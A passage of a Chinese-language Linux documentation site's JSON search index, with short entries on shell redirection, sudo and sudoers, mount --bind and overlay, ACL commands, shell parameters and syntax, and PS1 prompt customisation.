青藍色 37 47 白色 代码表 代码 意义 0 OFF 1 高亮显示 4 erline 5 闪烁 7 反白显示 8 不可见","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Color-table-and-code-table.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Color-table-and-code-table.html"},{"title":"重定向","text":"文件描述符 当执行shell命令时，会默认打开3个文件，每个文件有对应的文件描述符来方便我们使用 类型 文件描述符 默认情况 对应文件句柄位置 标准输入（standard input） 0 从键盘获得输入 /proc/self/fd/0 标准输出（standard output） 1 输出到屏幕（即控制台） /proc/self/fd/1 错误输出（error output） 2 输出到屏幕（即控制台） /proc/self/fd/2 所以我们平时在执行shell命令中，都默认是从键盘获得输入， 并且将结果输出到控制台上。但是我们可以通过更改文件描述符默认的指向， 从而实现输入输出的重定向。比如我们将1指向文件，那么标准的输出就会输出到文件中。 输出重定向 输出重定向的使用方式很简单，基本的一些命令如下: command >filename 把标准输出重定向到新文件中 command 1>filename 同上 command >>filename 把标准输出追加到文件中 command 1>>filename 同上 command 2>filename 把标准错误重定向到新文件中 command 2>>filename 把标准错误追加到新文件中 我们使用>或者>>对输出进行重定向。 符号的左边表示文件描述符，如果没有的话表示1，也就是标准输出， 符号的右边可以是一个文件，也可以是一个输出设备。 当使用>时，会判断右边的文件存不存在， 如果存在的话就先删除，然后创建一个新的文件， 不存在的话则直接创建。 但是当使用>>进行追加时，则不会删除原来已经存在的文件。 （这里>的创建只能创建在已经存在的目录下，目录不存在则报错） 输入重定向 在理解了输出重定向之后，理解输入重定向就会容易得多。对输入重定向的基本命令如下: command <filename 以filename文件作为标准输入 command 0<filename 同上 command <<delimiter 从标准输入中读入，直到遇到delimiter分隔符 command <<<delimiter 从标准输入中读入变量 我们使用<对输入做重定向，如果符号左边没有写值，那么默认就是0。 重定向顺序 command >log.txt 2>&1 将标准输出, 错误输出都输出到一个文件: command >log.txt 2>&1 理解的话可以按照顺序看, 先: >log.txt 此处省略了1, 即: 1>log.txt 表示把标准输出重定向到 log.txt, 后面的: 2>&1 表示把标准错误重定向到标准输出. command &>log.txt 官方提供了一个特殊的: command &>log.txt 与上面含义一致, 表示把标准错误重定向到标准输出.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Redirect.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Redirect.html"},{"title":"特殊的权限位","text":"Set-User-ID(SUID)位 s 或 S 替换用户的 x Set-Group-ID(SGID)位 s 或 S 替换组的 x 粘滞位 t 或 T 替代其他用户的 x","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Special-permissions.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Special-permissions.html"},{"title":"制表符","text":"参考: https://www.zhihu.com/question/19773623/answer/176124901 水平制表符（ \\t ） 相信大家对 \\t 还是比较熟悉的。 一般来说，其在终端和文件中的输出显示相当于按下键盘TAB键效果。 一般系统中，显示水平制表符将占8列。 同时水平制表符开始占据的初始位 置是第8*n列（第一列的下标为0）。 例如: puts(\"0123456\\txx\"); 垂直制表符（ \\v ） 垂直制表符不常用。 它的作用是让 \\v 后面的字符从下一行开始输出， 且开始的列数为 \\v 前一个字符所在列后面一列。 例如: puts(\"01\\v2345\") 但是竖直制表符在命令提示符中显示不出来， 只会显示一个框（可能是因为竖直制表符是打印的时候用的？）","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Tabs.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Tabs.html"},{"title":"/etc/hosts","text":"查看本地域名与地址映射, 内容为 地址与域名的映射, 例如, /etc/hosts 看起来如下: 127.0.0.1 localhost 127.0.1.1 host_name ### The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 每一行由 IP 地址 开始，接下来是相关联的 主机名 . host_name 匹配在 /etc/hostname 里定义的主机名。 对于有永久 IP 地址的系统，这个永久 IP 地址应当代替这里的 127.0.1.1 。 对于有永久 IP 地址和有 域名系统 Domain Name System (DNS) 提供 完全资格域名 fully qualified domain name (FQDN) 的系统，规范名 host_name.domain_name 应当被用来代替 host_name .","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Configuration-file-ETC-HOSTS.html","loc":"/yq-doc-source-docs-operating-system-linux-Configuration-file-ETC-HOSTS.html"},{"title":"/etc/resolv.conf","text":"配置本机使用dns服务器, 以nameserver开头, 可多行. 如果 resolvconf 软件包没有安装， /etc/resolv.conf 是一个静态文件。 如果安装了，它是一个符号链接。 此外，它包含有解析策略的初始化信息。如 DNS 是 IP= 192.168.11.1 ,则包含如下: nameserver 192.168.11.1 resolvconf 软件包使这个 /etc/resolv.conf 文件成为一个符号链接，并通过钩子脚本自动管理其内容。 注解 见: /docs/操作系统/linux/linux指令/resolvconf","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Configuration-file-ETC-Resolv-CONF.html","loc":"/yq-doc-source-docs-operating-system-linux-Configuration-file-ETC-Resolv-CONF.html"},{"title":"PS1","text":"参考 /docs/操作系统/linux/debian/debian手册/PS1 提示符定义","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-PS1.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-PS1.html"},{"title":"TMPDIR","text":"应用程序一般在临时存储目录 /tmp 下建立临时文件。 如果 /tmp 没有足够的空间， 可以通过 $TMPDIR 变量来为程序指定临时存储目录。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-TMPDIR.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-TMPDIR.html"},{"title":"at","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AT.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AT.html"},{"title":"lsmod","text":"内核模块可见: /docs/操作系统/linux/系统服务/内核模块","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LSMOD.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LSMOD.html"},{"title":"od","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-OD.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-OD.html"},{"title":"resolvconf","text":"注解 这是一个软件包, 不确定有没有指令 与 /etc/resolv.conf 相关, 配置域名解析服务地址 如果 resolvconf 软件包没有安装， /etc/resolv.conf 是一个静态文件。 如果安装了，它是一个符号链接. 此外，它包含有解析策略的初始化信息。如 DNS 是 IP=\" 192.168.11.1 \",则包含如下: nameserver 192.168.11.1 resolvconf 软件包使这个 /etc/resolv.conf 文件成为一个符号链接， 并通过钩子脚本自动管理其内容。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Resolvconf.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Resolvconf.html"},{"title":"sudo","text":"以系统管理者的身份执行指令 sudo 程序是为了使一个系统管理员可以给用户受限的 root 权限并记录 root 活动而设计的。 sudo 只需要一个普通用户的密码。 安装 sudo 软件包并通过设置 /etc/sudoers 中的选项来使用它 选项参数 -V 显示版本编号 -h 会显示版本编号及指令的使用方式说明 -l 显示出自己（执行 sudo 的使用者）的权限 -L 显示sudo设置 -v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码 -k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟） -b 将要执行的指令放在背景执行 -p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称 -u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码） -s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell -H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ） -i 切换到root用户, 并加载root的环境变量(需要输入当前用户的密码) 直接加 command 既可以系统管理者身份（或以 -u 更改为其他人）执行该 command 技巧 以root权限执行上一条命令: sudo !! 配置 可以在 /etc/sudoers 配置可使用sudo的用户: # /etc/sudoers ALL ALL=(ALL:ALL) ALL # ALL ALL=(ALL:ALL) ALL # username host=(user:group) cmd 多个cmd规则以逗号分隔 # 也可以仅写一个 设置免密，NOPASSWD:cmd # 设置禁止, !cmd # The first ALL is the users allowed, + % is group # The second one is the hosts # The third one is the user as you are running the command （root:root）user:group # The last one is the commands allowed # ALL 表示任何身份、主机、指令","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SUDO.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SUDO.html"},{"title":"chgrp","text":"用于文件的所有者或 root 账户修改文件所属的组: chgrp *newgroup* foo","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chGRP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chGRP.html"},{"title":"chmod","text":"用于文件的所有者或 root 账户修改文件和文件夹的访问权限: chmod [ugoa][+-=][rwxXst][,...] foo","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chmod.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chmod.html"},{"title":"fdisk","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-fdisk.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-fdisk.html"},{"title":"getfacle","text":"查看acl权限: getfacle $filename 例: [root@localhost /]# getfacl project #查看/prpject目录的ACL权限 #file: project <-文件名 #owner: root <-文件的属主 #group: tgroup <-文件的属组 user::rwx <-用户名栏是空的，说明是属主的权限 user:st:r-x <-用户st的权限 group::rwx <-组名栏是空的，说明是属组的权限 mask::rwx <-mask权限 other::--- <-其他人的权限 关于ACL权限参考: /docs/操作系统/linux/系统服务/ACL权限控制","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getfal.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getfal.html"},{"title":"insmod","text":"内核模块可见: /docs/操作系统/linux/系统服务/内核模块","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-insmod.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-insmod.html"},{"title":"mount","text":"mount命令 功能：文件挂载 格式: mount [-参数] [设备名称] [挂载点] 常用选项： -a 安装在/etc/fstab文件中类出的所有文件系统。 -f 伪装mount，作出检查设备和目录的样子，但并不真正挂载文件系统。 -n 不把安装记录在/etc/mtab 文件中。 -r 将文件系统安装为只读。 -v 详细显示安装信息。 -w 将文件系统安装为可写，为命令默认情况。 -t <文件系统类型> 指定设备的文件系统类型，常见的有： ext2 是linux目前常用的文件系统 msdos MS-DOS的fat，就是fat16 vfat windows98常用的fat32 nfs 网络文件系统 iso9660 CD-ROM光盘标准文件系统 ntfs windows NT/2000/XP的文件系统 auto 自动检测文件系统 -o <选项> 指定挂载文件系统时的选项，有些也可写到在 /etc/fstab 中。常用的有： defaults 使用所有选项的默认值（auto、nouser、rw、suid） auto/noauto 允许/不允许以 –a选项进行安装 dev/nodev 对/不对文件系统上的特殊设备进行解释 exec/noexec 允许/不允许执行二进制代码 suid/nosuid 确认/不确认suid和sgid位 user/nouser 允许/不允许一般用户挂载 codepage=XXX 代码页 iocharset=XXX 字符集 ro 以只读方式挂载 rw 以读写方式挂载 remount 重新安装已经安装了的文件系统 loop 挂载\"回旋设备\"以及\"ISO镜像文件\" --bind <dir1 dir2> 命令来将两个目录连接起来， mount --bind 命令是将前一个目录挂载到后一个目录上， 所有对后一个目录的访问其实都是对前一个目录的访问 关于 --bind mount --bind test1 test2 为例， 当 mount --bind 命令执行后，Linux将会把被挂载目录的目录项（也就是该目录文件的block，记录了下级目录的信息）屏蔽， 即test2的下级路径被隐藏起来了（注意，只是隐藏不是删除，数据都没有改变，只是访问不到了）。 同时，内核将挂载目录 test1 的目录项记录在内存里的一个s_root对象里， 在mount命令执行时，VFS会创建一个vfsmount对象，这个对象里包含了整个文件系统所有的mount信息， 其中也会包括本次mount中的信息，这个对象是一个HASH值对应表（HASH值通过对路径字符串的计算得来）， 表里就有 /test1 到 /test2 两个目录的HASH值对应关系。 命令执行完后，当访问 /test2下的文件时， 系统会告知 /test2 的目录项被屏蔽掉了， 自动转到内存里找VFS，通过 vfsmount 了解到 /test2 和 /test1 的对应关系， 从而读取到 /test1 的inode，这样在 /test2 下读到的全是 /test1 目录下的文件。 mount --bind连接的两个目录的inode号码并不一样， 只是被挂载目录的block被屏蔽掉，inode被重定向到挂载目录的inode（被挂载目录的inode和block依然没变）。 两个目录的对应关系存在于内存里，一旦重启挂载关系就不存在了。 在固件开发过程中常常遇到这样的情况：为测试某个新功能，必需修改某个系统文件。 而这个文件在只读文件系统上（总不能为一个小小的测试就重刷固件吧）， 或者是虽然文件可写，但是自己对这个改动没有把握，不愿意直接修改。这时候 mount --bind 就是你的好帮手。 假设我们要改的文件是/etc/hosts，可按下面的步骤操作: 把新的hosts文件放在/tmp下。 当然也可放在硬盘或U盘上。 mount --bind /tmp/hosts /etc/hosts , 此时的/etc目录是可写的，所做修改不会应用到原来的/etc目录， 可以放心测试。测试完成了执行 umount /etc/hosts 断开绑定(可参考: umount ) 例如: ## test1 test2为两个不同的目录 linux-UMLhEm:/home/test/linux # ls test1 11.test 1.test linux-UMLhEm:/home/test/linux # ls test2 22.test 2.test linux-UMLhEm:/home/test/linux # ls -lid test1 1441802 drwx------ 2 root root 4096 Feb 13 09:50 test1 linux-UMLhEm:/home/test/linux # ls -lid test2 1441803 drwx------ 2 root root 4096 Feb 13 09:51 test2 ## 执行mount --bind 将test1挂载到test2上，inode号都变为test1的inode linux-UMLhEm:/home/test/linux # mount --bind test1 test2 linux-UMLhEm:/home/test/linux # ls -lid test1 1441802 drwx------ 2 root root 4096 Feb 13 09:50 test1 linux-UMLhEm:/home/test/linux # ls -lid test2 1441802 drwx------ 2 root root 4096 Feb 13 09:50 test2 linux-UMLhEm:/home/test/linux # ls test2 11.test 1.test 参考: mount --bind使用方法 扩展可用存储空间 方案1: 使用 --bind 如果你在另一个分区里有一个带有可用空间的空目录（例如 /path/to/emp-dir ）， 你可以通过带有 \" --bind \" 选项的 mount ， 将它挂载到一个你需要更多空间的目录（例如 work-dir ）: $ sudo mount --bind /path/to/emp-dir work-dir 注解 这个只是相当于用 /path/to/emp-dir 暂时将 work-dir 屏蔽, 信息保存与内存中, 只建议测试使用 方案2: 使用 -t overlay 通过 overlay 挂载（overlay-mounting）另一个目录来扩展可用存储空间 如果你在另一个分区表中有可用的空间（例如， /path/to/empty 和 /path/to/work ）， 你可以在其中建立一个目录并堆栈到你需要空间的那个旧的目录（例如， /path/to/old ）， 要这样做，你需要用于 Linux 3.18 版内核或更新版本（对应 Debian Stetch 9.0 或更新版本） 的 OverlayFS $ sudo mount -t overlay overlay \\ -olowerdir=/path/to/old-dir,upperdir=/path/to/empty,workdir=/path/to/work /path/to/empty 和 /path/to/work 应该位于可读写的分区，从而能够写入 /path/to/old","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mount.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mount.html"},{"title":"rmmod","text":"参数： -f 强制将该模组移除掉，不论是否正被使用； -w 若该模组正被使用，则 rmmod 会等待该模组被使用完毕后，才移除他！ 内核模块可见: /docs/操作系统/linux/系统服务/内核模块","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rmmod.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rmmod.html"},{"title":"set","text":"set命令用于设置显示当前shell的变量。 set指令能设置所使用shell的执行方式，可依照不同的需求来做设置。 语法: set [+-abCdefhHklmnpPtuvx] 若不加任何参数, 会 显示当前的环境变量和位置参数 . 这时候于env区别可见: /docs/操作系统/linux/linux指令/env 常用: # set -e #若指令传回值不等于0，则立即退出 +e #关闭上面那个，让原脚本继续执行 一般配套使用 -- <args> #设置参数 如 set -- h1 h2 ;echo $@,$# #h1 h2,2 选项参数 -a 标示已修改的变量，以供输出至环境变量。 -b 使被中止的后台程序立刻回报执行状态。 -C 转向所产生的文件无法覆盖已存在的文件。 -d Shell预设会用杂凑表记忆使用过的指令，以加速指令的执行。使用-d参数可取消。 -e 若指令传回值不等于0，则立即退出shell。 -f 取消使用通配符。 -h 自动记录函数的所在位置。 -H <Shell> 可利用\"!\"加<指令编号>的方式来执行history中记录的指令。 -k 指令所给的参数都会被视为此指令的环境变量。 -l 记录for循环的变量名称。 -m 使用监视模式。 -n 只读取指令，而不实际执行。 -p 启动优先顺序模式。 -P 启动-P参数后，执行指令时，会以实际的文件或目录来取代符号连接。 -t 执行完随后的指令，即退出shell。 -u 当执行时使用到未定义过的变量，则显示错误信息, 可以与-e一起使用 -v 显示shell所读取的输入值。 -x 执行指令后，会先显示该指令及所下的参数。 -g x 设置全局变量 -s x 设置本地变量 其他: +<参数> 取消某个set曾启动的参数。 一些用途 set 指令在Shell脚本中有多种作用，以下是一些常见的用法: 设置位置参数：使用 set 命令可以将一个或多个值设置为脚本的位置参数。 例如：set foo bar 会将 foo 和 bar 分别设置为 $1 和 $2。 显示和修改Shell选项：使用 set -<option> 命令可以启用或禁用特定的Shell选项。 例如，set -e 启用了脚本的异常终止（错误即退出）选项。 显示和修改变量：使用 set 命令可以显示当前设置的变量。 例如，set 会显示所有的环境变量和用户定义的变量。可以使用 set <variable>=<value> 来修改或创建新的变量。 展开变量：使用 set -x 命令可以打开脚本的调试模式，从而在运行脚本时输出每个命令的展开结果。 处理命令行选项：使用 set -- <args> 可以将指定的参数设置为脚本的位置参数，这样就可以像处理命令行选项一样访问和处理这些参数。 配置特殊字符：使用 set 命令可以更改Shell的特殊字符处理方式。 例如，使用 set -f 可以禁用文件名扩展。 注解 set 命令的具体行为可能会因不同的Shell和环境而有所不同。 可以使用 help set 或查阅相关文档来获取更详细的信息 在 shell 中执行 set -x 或使用 -x 选项启动 shell 可以让 shell 显示出所有执行的命令. 对调试来说是非常方便的","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-set.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-set.html"},{"title":"setfacle","text":"设置acl权限: setfacle 选项 文件名 选项 -m 设定 ACL 权限。 如果是给予用户 ACL 权限，则使用\"u:用户名：权限\"格式赋予； 如果是给予组 ACL 权限，则使用\"g:组名：权限\" 格式赋予； -x 删除指定的 ACL 权限； -b 删除所有的 ACL 权限； -d 设定默认 ACL 权限。只对目录生效，指目录中新建立的文件拥有此默认权限； -k 删除默认 ACL 权限； -R 递归设定 ACL 权限。指设定的 ACL 权限会对目录下的所有子文件生效； 关于ACL权限参考: /docs/操作系统/linux/系统服务/ACL权限控制","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-setfal.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-setfal.html"},{"title":"wall","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wall.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wall.html"},{"title":"硬盘分区配置","text":"对于 硬盘分区 配置， 尽管 /docs/操作系统/linux/linux指令/fdisk 被认为是标准的配置， 但是 /docs/操作系统/linux/linux指令/parted 工具还是值得注意的 老的 PC 使用经典的 主引导记录（Master Boot Record，MBR） 方案， 将 硬盘分区 数据保存在第一个扇区，即 LBA 扇区 0（512 字节）。 一些带有 可扩展固件接口（Unified Extensible Firmware Interface，UEFI） 的近代 PC，包括基于 Intel 的 Mac，使用 全局唯一标识分区表（GUID Partition Table，GPT） 方案， 硬盘分区 数据不保存在第一个扇区。 尽管 /docs/操作系统/linux/linux指令/fdisk 一直是硬盘分区的标准工具， 但现在 /docs/操作系统/linux/linux指令/parted 替代了它。 LVM2 LVM2 是一个用于 Linux 内核的 逻辑卷管理器 . 使用 LVM2 的话，硬盘分区可以创建在逻辑卷上来替代物理硬盘。 LVM 有下列需求 Linux 内核中的设备映射支持（Debian 内核默认支持） 用户自定义设备映射支持库（ libdevmapper* 软件包） 用户自定义 LVM2 工具（ lvm2 软件包） 通过 $TMPDIR 指定临时存储目录 见: /docs/操作系统/linux/Linux环境变量/TMPDIR 挂载另一个分区来扩展可用存储空间 如果你有一个空的分区（例如 /dev/sdx ）， 你可以使用 mkfs.ext4 将它格式化， 并使用 /docs/操作系统/linux/linux指令/mount 将它挂载到你需要更多空间的目录。（你需要复制原始数据内容。）: $ sudo mv work-dir old-dir $ sudo mkfs.ext4 /dev/sdx $ sudo mount -t ext4 /dev/sdx work-dir $ sudo cp -a old-dir/* work-dir $ sudo rm -rf old-dir 注解 你也可以选择挂载一个空硬盘映像文件 （参见 第 9.7.5 节 \"制作空的磁盘映像文件\" ） 作为一个循环设备 （参见 第 9.7.3 节 \"挂载磁盘映像文件\" )。 实际的硬盘使用量会随着实际存储数据的增加而增加 关于扩展可用存储空间可见: Disk-Partition-mount","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Hard-disk-partition-configuration.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Hard-disk-partition-configuration.html"},{"title":"文件读取","text":"while read line 重定向: while read line do … done < file read通过输入重定向，把file的第一行所有的内容赋值给变量line， 循环体内的命令一般包含对变量line的处理； 然后循环处理file的第二行、第三行。。。一直到file的最后一行。 还记得while根据其后的命令退出状态来判断是否执行循环体吗？ 是的，read命令也有退出状态，当它从文件file中读到内容时，退出状态为0，循环继续进行； 当read从文件中读完最后一行后，下次便没有内容可读了，此时read的退出状态为非0，所以循环才会退出。 使用管道: command | while read line do … done","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-File-reading.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-File-reading.html"},{"title":"Shell的return","text":"shell的return 今天写bug发现shell的return与之前java的不一样 return其实与exit基本一致 不一致的地方在于函数内return只是退出函数，exit退出脚本 返回的值只能为0-255的数字 判断时可用，而不能传递字符串之类的 操作字符串只能用全局变量了（或者echo）","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell's-Return.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell's-Return.html"},{"title":"Shell循环","text":"跳出循环 continue 与 break 后面跟 n 表示退出几层循坏","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-cycle.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-cycle.html"},{"title":"Shell传递参数","text":"主要是Shell传递命令行参数 特殊的 shell 参数经常在 shell 脚本里面被用到: shell 参数 值 $0 shell 或 shell 脚本的名称 $1 第一个 shell 参数 $9 第 9 个 shell 参数 $### 位置参数数量 \"$*\" \"$1 $2 $3 $4 … \" \"$@\" \"$1\" \"$2\" \"$3\" \"$4\" … $? 最近一次命令的退出状态码 $$ 这个 shell 脚本的 PID $! 最近开始的后台任务 PID Shell参数展开列表 参数表达式形式 如果 var 变量已设置那么值为 如果 var 变量没有被设置那么值为: ${var:-string} \"$var\" \"string\" ${var:+string} \"string\" \"null\" ${var:=string} \"$var\" \"string\" (并运行 \"var=string\") ${var:?string} \"$var\" 在 stderr 中显示 \"string\" (出错退出) 详见: shell的变量替换 重要的Shell参数替换列表 参数替换形式与结果: ${var%suffix} 删除位于 var 结尾的 suffix 最小匹配模式 ${var%%suffix} 删除位于 var 结尾的 suffix 最大匹配模式 ${var###prefix} 删除位于 var 开头的 prefix 最小匹配模式 ${var####prefix} 删除位于 var 开头的 prefix 最大匹配模式 详见: shell的变量替换","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-pass-parameter.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-pass-parameter.html"},{"title":"bash数组","text":"定义数组: arr=(a b c d) ${arr[@]} #和 ${arr[*]} #相同，都是返回整个数组，包括四个元素。 通过中括号及下标获取其中的某一个元素: ${arr[0]} #得到 a (第一个元素)， ${arr[1]} #第二个... 使用井号（#）计算数组的长度: ${#arr[@]} #或 ${#arr[*]} #4 （使用井号计算长度时，若参数为字符串则返回字符串的长度，若参数为数组则返回数组中元素的个数。）","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-bash-array.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-bash-array.html"},{"title":"单/双引号","text":"单引号 所见即所得，输入什么就是什么。 即将单引号内的内容原样输出，或者描述为单引号里面看到的是什么就会输出什么。 双引号 解析特殊符号（命令啥的），不支持通配符解析。 把双引号内的内容输出出来；如果内容中有命令、变量等，会先把变量、命令解析出结果，然后在输出最终内容来。 不加引号 特殊符号，通配符全部解析。 不会将含有空格的字符串视为一个整体输出, 如果内容中有命令、变量等，会先把变量、命令解析出结果，然后在输出最终内容来; 如果字符串中带有空格等特殊字符，则不能完整的输出，需要改加双引号，一般连续的字符串，数字，路径等可以用。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-quotation-marks.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-quotation-marks.html"},{"title":"快捷键","text":"ctrl 组合键 ctrl + c 终止目前的命令 ctrl + d 输入结束（EOF），例如邮件结束的时候 ctrl + M enter ctrl + s 暂停屏幕输出 ctrl + q 恢复屏幕输出 ctrl + u 在提示字符下，将整列命令删除 ctrl + z 暂停 目前的命令 当输入一串指令时，发现前面写的一串数据是错的， 想要删除游标所在处到最前面的指令内容，应该如何处理: ctrl + u","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shortcut-key.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shortcut-key.html"},{"title":"PS1 提示符定义","text":"参考: linux PS1 提示符定义 PS1 就是用户平时的提示符。 PS2 第一行没输完，等待第二行输入的提示符。 Linux系统提示符是用系统变量PS1来定义的。 一般系统默认的形式是：[ username@host 工作目录]$. 用 echo $PS1 可以得到PS1的值，即: PS1=\"[\\u@\\h \\w]\"\\$ 登录后可以更改PS1的显示样式，但是当退出重启登录进入系统后， 样式又变成系统默认的样式了，如果要彻底改变它的样式，只能从配置文件中改。 PS是在用户根目录下的.bash_profile中定义的。 如: # .bash_profile # Get the aliases and functions if [ -f ~/.bashrc ]; then . ~/.bashrc fi # User specific environment and startup programs 以下是设定的PS1的值: PS1=\"[\\u@\\h \\w]\\$\" PATH=$PATH:$HOME/bin 使用export把PS1输出，以使它可以在子shell中生效,这会造成ROOT用户的也采用此样式, export PS1 要慎用: export PATH unset USERNAME 下面简单说说环境下默认的特殊符号所代表的意义: \\d: 代表日期，格式为weekday month date，例如：\"Mon Aug 1\" \\H: 完整的主机名称。例如：我的机器名称为：fc4.linux，则这个名称就是fc4.linux \\h: 仅取主机的第一个名字，如上例，则为fc4，.linux则被省略 \\t: 显示时间为24小时格式，如：HH：MM：SS \\T: 显示时间为12小时格式 \\A: 显示时间为24小时格式：HH：MM \\u: 当前用户的账号名称 \\v: BASH的版本信息 \\w: 完整的工作目录名称。家目录会以 ~代替 \\W: 利用basename取得工作目录名称，所以只会列出最后一个目录 \\#: 下达的第几个命令 \\$: 提示字符，如果是root时，提示符为：# ，普通用户则为：$ 我们可以通过设置PS1变量使提示符成为彩色。 在PS1中设置字符序列颜色的格式为: \\[\\e[F;Bm\\] # 其实 \\e[Fm 即可 # 其中 F 为字体颜色，编号30~37； B 为背景色，编号40~47。 # 可通过 \\e[0m 关闭颜色输出；特别的，当B为1时，将显示加亮加粗的文字， 颜色表与代码表见 /docs/操作系统/linux/概念性/颜色表与代码表","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-PS1-prompt-definition.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-PS1-prompt-definition.html"},{"title":"套接字","text":"套接字被广泛应用于所有的互联网通信，数据库和操作系统本身。 它类似于命名管道（FIFO）并且允许进程之间甚至不同计算机之间进行信息交换。 对于套接字，这些进程不需要在同一时间运行，也不需要是同一个父进程的子进程。 它是 进程间通信（IPC） 的一个节点。信息的交换可能会通过网络发生在不同主机之间。 最常见的两种是 互联网套接字 和 UNIX域套接字 通过 \"`netstat -an`\" 命令可以很方便的查看系统已经打开了哪些套接字","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Puzzle.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Puzzle.html"},{"title":"记录 shell 活动","text":"shell 命令的输出有可能滚动出了屏幕， 并可能导致你无法再查看到它。 将shell活动记录到文件中再来回顾它是个不错的主意。 当你执行任何系统管理任务时，这种记录是必不可少的。 运行 shell。尝试下列例子: $ script Script started, file is typescript 在 script 下使用任何 shell 命令。 按 Ctrl-D 来退出 script $ vim typescript","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Record-shell-activity.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Record-shell-activity.html"},{"title":"熵","text":"Linux内核采用熵来描述数据的随机性。 熵（entropy）是描述系统混乱无序程度的物理量， 一个系统的熵越大则说明该系统的有序性越差，即不确定性越大。 